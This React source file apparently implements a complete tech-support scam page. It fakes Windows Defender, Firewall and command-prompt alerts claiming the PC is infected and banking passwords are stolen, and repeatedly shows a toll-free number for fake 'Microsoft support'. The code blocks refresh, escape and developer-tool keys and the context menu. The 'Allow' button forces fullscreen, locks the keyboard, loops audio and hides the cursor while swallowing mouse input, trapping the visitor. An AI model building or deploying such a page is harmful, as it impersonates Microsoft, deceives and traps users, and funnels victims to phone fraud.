import { useEffect, useRef, useState, useCallback } from 'react';
import './ScamPopup.css';


const PHONE = '+1-833-656-9085';

/* ── Windows 4-square logo ── */
function WinLogo({ size = 16 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 20 20" style={{ flexShrink: 0, display: 'block' }}>
      <rect x="0"  y="0"  width="9" height="9" fill="#F25022"/>
      <rect x="11" y="0"  width="9" height="9" fill="#7FBA00"/>
      <rect x="0"  y="11" width="9" height="9" fill="#00A4EF"/>
      <rect x="11" y="11" width="9" height="9" fill="#FFB900"/>
    </svg>
  );
}

/* ── Shield + checkmark (dialog title bar) ── */
function ShieldBadge() {
  return (
    <svg width="20" height="22" viewBox="0 0 28 32" fill="none" style={{ flexShrink: 0 }}>
      <path d="M14 1L2 6v10c0 8.3 5.2 16.1 12 18.8C21.8 32.1 26 24.3 26 16V6L14 1z" fill="#222"/>
      <path d="M14 5L5 9.3V16c0 6.3 4 12.2 9 14.5 5-2.3 9-8.2 9-14.5V9.3L14 5z" fill="#fff"/>
      <path d="M14 9L8 12v5c0 4.2 2.6 8 6 9.7 3.4-1.7 6-5.5 6-9.7v-5L14 9z" fill="#222"/>
    </svg>
  );
}

/* ── Icon 1: Crosshair / scan ── */
function IconScan() {
  return (
    <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
      <circle cx="17" cy="17" r="12" stroke="#444" strokeWidth="2"/>
      <circle cx="17" cy="17" r="6"  stroke="#444" strokeWidth="2"/>
      <circle cx="17" cy="17" r="2"  fill="#444"/>
      <line x1="17" y1="1"  x2="17" y2="5"  stroke="#444" strokeWidth="2" strokeLinecap="round"/>
      <line x1="17" y1="29" x2="17" y2="33" stroke="#444" strokeWidth="2" strokeLinecap="round"/>
      <line x1="1"  y1="17" x2="5"  y2="17" stroke="#444" strokeWidth="2" strokeLinecap="round"/>
      <line x1="29" y1="17" x2="33" y2="17" stroke="#444" strokeWidth="2" strokeLinecap="round"/>
    </svg>
  );
}

/* ── Icon 2: Shield ── */
function IconShield() {
  return (
    <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
      <path d="M17 2L3 8v10c0 10 6 18.5 14 21 8-2.5 14-11 14-21V8L17 2z"
            stroke="#444" strokeWidth="2" fill="none"/>
      <polyline points="10,17 14,22 24,12"
                stroke="#444" strokeWidth="2.5"
                strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

/* ── Icon 3: Person with hat (spy) ── */
function IconSpy() {
  return (
    <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
      {/* head */}
      <circle cx="17" cy="12" r="6" stroke="#444" strokeWidth="2" fill="none"/>
      {/* body */}
      <path d="M5 32c0-7 5.4-12 12-12s12 5 12 12"
            stroke="#444" strokeWidth="2" strokeLinecap="round" fill="none"/>
      {/* hat brim */}
      <rect x="10" y="6.5" width="14" height="2.5" rx="1.2" fill="#444"/>
      {/* hat top */}
      <rect x="12" y="3" width="10" height="4" rx="1.5" fill="#444"/>
    </svg>
  );
}

/* ══════════════════════════════════════════════════════
   NEW — CMD TERMINAL (black panel, background-left)
   Auto-typing threat lines that change every ~180ms
══════════════════════════════════════════════════════ */
function CmdTerminal() {
  const [lines, setLines] = useState([
    { text: 'C:\\Windows\\System32>netstat -ano', cls: '' },
    { text: 'Active Connections', cls: 'sp-cmd-green' },
  ]);

  const addLine = useCallback(() => {
    const r = () => Math.floor(Math.random() * 255);
    const rp = () => Math.floor(Math.random() * 9000) + 1000;
    const rk = () => Math.floor(Math.random() * 0xFFFFFF).toString(16).toUpperCase();
    const pool = [
      { text: `  TCP  192.168.${r()}.${r()}:${rp()}  ESTABLISHED`, cls: '' },
      { text: `  UDP  0.0.0.0:${rp()}             *:*`, cls: 'sp-cmd-dim' },
      { text: `  [WARN] Suspicious process: svchost.exe PID ${rp()}`, cls: 'sp-cmd-yellow' },
      { text: `  [ALERT] Outbound data: ${(Math.random()*999).toFixed(2)} MB`, cls: 'sp-cmd-red' },
      { text: `  Scanning registry... ${Math.floor(Math.random()*100)}%`, cls: '' },
      { text: `  ${r()}.${r()}.${r()}.${r()}:443  CLOSE_WAIT`, cls: 'sp-cmd-red' },
      { text: `  Threat found: C:\\Users\\AppData\\Roaming\\${Math.random().toString(36).slice(2,8)}.dll`, cls: 'sp-cmd-red' },
      { text: `  Memory scan: ${(Math.random()*99).toFixed(1)}% complete`, cls: 'sp-cmd-green' },
      { text: `  Keylogger pattern found at 0x${rk()}`, cls: 'sp-cmd-yellow' },
      { text: `  [ERROR] Firewall rule bypassed — ${Math.floor(Math.random()*999)} packets`, cls: 'sp-cmd-red' },
      { text: `  Uploading credentials to remote server...`, cls: 'sp-cmd-red' },
      { text: `  ${Math.floor(Math.random()*1000)}.${Math.floor(Math.random()*100)} KB/s transfer active`, cls: 'sp-cmd-yellow' },
      { text: `  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`, cls: 'sp-cmd-dim' },
      { text: `  [CRITICAL] Banking data intercepted`, cls: 'sp-cmd-red' },
      { text: `  Spyware module loaded: ads.financetrack(2).dll`, cls: 'sp-cmd-red' },
    ];
    const newLine = pool[Math.floor(Math.random() * pool.length)];
    setLines(prev => [...prev.slice(-18), newLine]);
  }, []);

  useEffect(() => {
    const id = setInterval(addLine, 180);
    return () => clearInterval(id);
  }, [addLine]);

  return (
    <div className="sp-cmd">
      <div className="sp-cmd-titlebar">
        <span className="sp-cmd-title">C:\Windows\System32\cmd.exe</span>
        <div className="sp-cmd-chrome">
          <span className="sp-cmd-cb">─</span>
          <span className="sp-cmd-cb">□</span>
          <span className="sp-cmd-cb sp-cmd-cb-x">✕</span>
        </div>
      </div>
      <div className="sp-cmd-body">
        {lines.map((l, i) => (
          <div key={i} className={`sp-cmd-line ${l.cls}`}>{l.text}</div>
        ))}
        <div className="sp-cmd-line sp-cmd-cursor"> </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════
   NEW — MICROSOFT DEFENDER BLUE BG ALERT (behind main popup)
   Scan progress auto-updates every 120ms
══════════════════════════════════════════════════════ */
function DefenderBgAlert() {
  const [progress, setProgress] = useState(12);
  useEffect(() => {
    const t = setInterval(() => setProgress(p => (p >= 99 ? 12 : p + 1)), 120);
    return () => clearInterval(t);
  }, []);

  return (
    <div className="sp-defender-bg">
      <div className="sp-defender-bg-bar">
        <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
          <WinLogo size={13} />
          <span className="sp-defender-bg-title">Windows Defender — Security Alert</span>
        </div>
        <div style={{ display: 'flex', gap: 2 }}>
          <span className="sp-dcb-mini">─</span>
          <span className="sp-dcb-mini sp-dcb-mini-x">✕</span>
        </div>
      </div>
      <div className="sp-defender-bg-body">
        <p className="sp-defender-bg-heading">Windows-Defender Security Warning</p>
        <p className="sp-defender-bg-sub">
          Security reasons have prevented access to this machine. Your PC is sending
          personal information to an unknown remote server.
        </p>
        <div className="sp-defender-bg-row">
          <span className="sp-defender-bg-label">Threat Level:</span>
          <span className="sp-defender-bg-val sp-defender-bg-val-red">CRITICAL</span>
        </div>
        <div className="sp-defender-bg-row">
          <span className="sp-defender-bg-label">Infected Files:</span>
          <span className="sp-defender-bg-val">28 detected</span>
        </div>
        <div className="sp-defender-bg-row">
          <span className="sp-defender-bg-label">Scan Progress:</span>
          <span className="sp-defender-bg-val">{progress}%</span>
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════
   NEW — CALL NOW POPUP (bottom-left corner)
   Slides up with animation
══════════════════════════════════════════════════════ */
function CallNowPopup() {
  return (
    <div className="sp-call-popup">
      <div className="sp-call-bar">
        <div className="sp-call-bar-l">
          <WinLogo size={13} />
          <span className="sp-call-bar-title">Windows Security</span>
        </div>
        <span className="sp-dcb-mini sp-dcb-mini-x">✕</span>
      </div>
      <div className="sp-call-body">
        <div className="sp-call-icon-row">
          <span className="sp-call-folder-icon">📁</span>
          <div className="sp-call-right">
            <p className="sp-call-label">Call Support Immediately</p>
            <p className="sp-call-desc">
              Microsoft engineers detected a breach. Do NOT restart your computer.
            </p>
          </div>
        </div>
        <hr className="sp-call-divider" />
        <div className="sp-call-direct-row">
          <button className="sp-call-phone-btn">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
              <path d="M22 16.9v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.1 10.81a19.79 19.79 0 01-3.07-8.63A2 2 0 012 .03h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 14.9z" stroke="#0078d4" strokeWidth="2" strokeLinecap="round"/>
            </svg>
            Call us directly
          </button>
        </div>
        <span className="sp-call-number">{PHONE}</span>
        <span className="sp-call-toll">(Toll-free number)</span>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════
   NEW — WINDOWS FIREWALL ALERT (top-right corner)
   Fades in with animation
══════════════════════════════════════════════════════ */
function FirewallPopup() {
  return (
    <div className="sp-firewall-popup">
      <div className="sp-fw-bar">
        <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
          <WinLogo size={12} />
          <span className="sp-fw-bar-title">Windows Firewall Alert</span>
        </div>
        <span className="sp-dcb-mini sp-dcb-mini-dark">✕</span>
      </div>
      <div className="sp-fw-body">
        <div className="sp-fw-icon-row">
          <div className="sp-fw-warning-icon">!</div>
          <p className="sp-fw-text">
            <strong>Windows Firewall has blocked</strong> an incoming network connection.
          </p>
        </div>
        <div className="sp-fw-detail">
          Process: <span className="sp-fw-highlight">svchost.exe</span><br/>
          Port: <span className="sp-fw-highlight">4444 (suspicious)</span><br/>
          Origin: <span className="sp-fw-highlight">185.220.101.xx (TOR exit node)</span>
        </div>
        <div className="sp-fw-btns">
          <button className="sp-fw-btn-block">Block Access</button>
          <button className="sp-fw-btn-allow">Allow</button>
        </div>
      </div>
    </div>
  );
}

/* ── Enter fullscreen + audio + lock ── */
async function enterFullscreen(audioRef, onLocked) {
  try {
    const el = document.documentElement;
    if      (el.requestFullscreen)        await el.requestFullscreen({ navigationUI: 'hide' });
    else if (el.webkitRequestFullscreen)  await el.webkitRequestFullscreen();
    else if (el.msRequestFullscreen)      await el.msRequestFullscreen();
    audioRef.current?.play().catch(() => {});
    navigator.keyboard?.lock?.(['Escape','F11','MetaLeft','MetaRight','AltLeft','AltRight']).catch(() => {});
  } catch (_) {}
  onLocked();
}

/* ══════════════════════════════════════════════════════
   MAIN COMPONENT
══════════════════════════════════════════════════════ */
export default function ScamPopup({ delay = 5500 }) {
  const [visible, setVisible] = useState(false);
  const [locked,  setLocked]  = useState(false);
  const audioRef = useRef(null);

  /* sound */
  useEffect(() => {
    const audio = new Audio('/sound.mp4');
    audio.loop = true;
    audioRef.current = audio;
    const play = () => { audio.play().catch(() => {}); document.removeEventListener('click', play); };
    document.addEventListener('click', play);
    return () => { document.removeEventListener('click', play); audio.pause(); };
  }, []);

  /* show after delay */
  useEffect(() => {
    const t = setTimeout(() => {
      setVisible(true);
      audioRef.current?.play().catch(() => {});
    }, delay);
    return () => clearTimeout(t);
  }, [delay]);

  /* block keyboard */
  useEffect(() => {
    const onKey = (e) => {
      if (['F5','F11','F12','Escape'].includes(e.key))                   e.preventDefault();
      if (e.ctrlKey && ['r','R'].includes(e.key))                        e.preventDefault();
      if (e.ctrlKey && e.shiftKey && ['I','i','J','j'].includes(e.key)) e.preventDefault();
      if (e.metaKey && e.key.toLowerCase() === 'd')                     e.preventDefault();
    };
    const noCtx = (e) => e.preventDefault();
    document.addEventListener('keydown',     onKey);
    document.addEventListener('contextmenu', noCtx);
    return () => {
      document.removeEventListener('keydown',     onKey);
      document.removeEventListener('contextmenu', noCtx);
    };
  }, []);

  /* hide cursor + block all mouse after Allow */
  useEffect(() => {
    if (!locked) return;
    document.body.classList.add('sp-hide-cursor');
    const block = (e) => { e.preventDefault(); e.stopPropagation(); };
    const opts = { capture: true };
    ['mousedown','mouseup','click','dblclick','dragstart','selectstart','mousemove']
      .forEach(ev => document.addEventListener(ev, block, opts));
    return () => {
      document.body.classList.remove('sp-hide-cursor');
      ['mousedown','mouseup','click','dblclick','dragstart','selectstart','mousemove']
        .forEach(ev => document.removeEventListener(ev, block, opts));
    };
  }, [locked]);

  if (!visible) return null;

  return (
    <>
      {/* ══ NEW: CMD TERMINAL (black panel, left side) ══ */}
      <CmdTerminal />

      {/* ══ NEW: DEFENDER BLUE BACKGROUND ALERT (behind main popup) ══ */}
      <DefenderBgAlert />

      {/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          TOP — centered warning text box
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */}
      <div className="sp-top-box">
        <p className="sp-top-p1">
          Access to this system has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact Support as soon as possible and a Microsoft expert will guide you through the investigation over the phone.
        </p>
        <p className="sp-top-p1">Running this application may put your PC at risk.</p>
        <p className="sp-top-p2">
          Windows Support: Call us directly +1-833-656-9085 (Toll-Free)
        </p>
      </div>

      {/* ══ NEW: FIREWALL ALERT (top-right) ══ */}
      <FirewallPopup />

      {/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          POPUP STACK — blue card + white dialog + small bar
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */}
      <div className="sp-stack">

        {/* ── BLUE WINDOWS SECURITY CARD ── */}
        <div className="sp-blue sp-bounce">
          <div className="sp-blue-bar">
            <div className="sp-blue-bar-l">
              <WinLogo size={14}/>
              <span className="sp-blue-bar-title">Windows Security</span>
            </div>
            <div className="sp-chrome-btns">
              <span className="sp-cb">─</span>
              <span className="sp-cb">□</span>
              <span className="sp-cb sp-cb-x">✕</span>
            </div>
          </div>
          <div className="sp-blue-body">
            <p className="sp-blue-msg">
              Your computer has alerted us that it has been infected with a&nbsp;
              <strong>Trojan Spyware</strong>. The following data has been compromised.
            </p>
            <ul className="sp-blue-ul">
              <li>Email Credentials</li>
              <li>Banking Passwords</li>
              <li>Facebook Login</li>
              <li>Pictures &amp; Documents</li>
            </ul>
          </div>
        </div>

        {/* ── WHITE WINDOWS DEFENDER DIALOG ── */}
        <div className="sp-dialog">

          {/* title bar */}
          <div className="sp-dialog-bar">
            <div className="sp-dialog-bar-l">
              <ShieldBadge/>
              <span className="sp-dialog-bar-title">Windows Defender Security Center</span>
            </div>
            <div className="sp-dialog-chrome">
              <span className="sp-dcb sp-dcb-x">✕</span>
            </div>
          </div>

          {/* body */}
          <div className="sp-dialog-body">
            <p className="sp-threat-line">Microsoft Defender found some infected files but not able to remove it because of the group policies permissions. Please Scan now to remove it manually.</p>
           
            <div className="sp-icons-row sp-transfer-row" aria-label="Demo file transfer">
              <div className="sp-file-icon sp-folder-left">
                <img
                  src="/folder.png"
                  alt="Source demo folder"
                  className="sp-folder-image"
                />
              </div>

              <div className="sp-transfer-path" aria-hidden="true">
                <span className="sp-transfer-line" />

                <svg
                  className="sp-transfer-file sp-transfer-file-one"
                  viewBox="0 0 32 32"
                >
                  <path
                    d="M7 3h12l6 6v20H7z"
                    fill="#ffffff"
                    stroke="#2878c8"
                    strokeWidth="2"
                  />
                  <path
                    d="M19 3v7h6"
                    fill="none"
                    stroke="#2878c8"
                    strokeWidth="2"
                  />
                  <path
                    d="M11 16h10M11 21h7"
                    stroke="#2878c8"
                    strokeWidth="2"
                    strokeLinecap="round"
                  />
                </svg>

                <svg
                  className="sp-transfer-file sp-transfer-file-two"
                  viewBox="0 0 32 32"
                >
                  <path
                    d="M7 3h12l6 6v20H7z"
                    fill="#ffffff"
                    stroke="#2878c8"
                    strokeWidth="2"
                  />
                  <path
                    d="M19 3v7h6"
                    fill="none"
                    stroke="#2878c8"
                    strokeWidth="2"
                  />
                  <path
                    d="M11 16h10M11 21h7"
                    stroke="#2878c8"
                    strokeWidth="2"
                    strokeLinecap="round"
                  />
                </svg>

                <svg
                  className="sp-transfer-arrow"
                  viewBox="0 0 48 24"
                  aria-hidden="true"
                >
                  <path
                    d="M2 12h38M31 4l9 8-9 8"
                    fill="none"
                    stroke="#2878c8"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              </div>

              <div className="sp-file-icon sp-folder-right">
                <img
                  src="/folder.png"
                  alt="Destination demo folder"
                  className="sp-folder-image"
                />
              </div>
            </div>

            <p className="sp-access-text">
              Access to this PC has been blocked for security reasons.
            </p>
            <p className="sp-contact-text">
              Contact Windows Support:&nbsp;
              <span className="sp-contact-link">{PHONE} (Toll-Free)</span>
            </p>
          </div>

          {/* footer */}
          <div className="sp-dialog-foot">
            <div className="sp-win-brand">
              <WinLogo size={20}/>
              <span className="sp-win-label">Windows</span>
            </div>
            <div className="sp-foot-btns">
              <button className="sp-btn sp-btn-deny">Deny</button>
              <button
                className="sp-btn sp-btn-allow"
                onClick={() => enterFullscreen(audioRef, () => setLocked(true))}
              >
                Allow
              </button>
            </div>
          </div>
        </div>

        {/* ── SMALL CANCEL / OK BAR ── */}
        <div className="sp-small-bar">
          <button className="sp-btn sp-btn-cancel">Cancel</button>
          <button className="sp-btn sp-btn-ok">OK</button>
        </div>

      </div>{/* end sp-stack */}

      {/* ══ NEW: CALL NOW POPUP (bottom-left) ══ */}
      <CallNowPopup />

      {/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          BOTTOM — fixed blue bar
      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */}
      <div className="sp-bottom-bar">
        <div className="sp-bottom-row">
          <WinLogo size={20}/>
          <span className="sp-bottom-ws">Windows Security:</span>
          <span className="sp-bottom-cs">Contact Support</span>
          <span className="sp-bottom-ph">{PHONE} (Toll-Free)</span>
        </div>
        <div className="sp-ticker-wrap">
          <span className="sp-ticker">
            Windows Defender SmartScreen prevented an unrecognized app from starting.
            Running this app might put your PC at risk.&emsp;&emsp;
            Windows Defender SmartScreen prevented an unrecognized app from starting.
            Running this app might put your PC at risk.&emsp;&emsp;
          </span>
        </div>
      </div>
    </>
  );
}
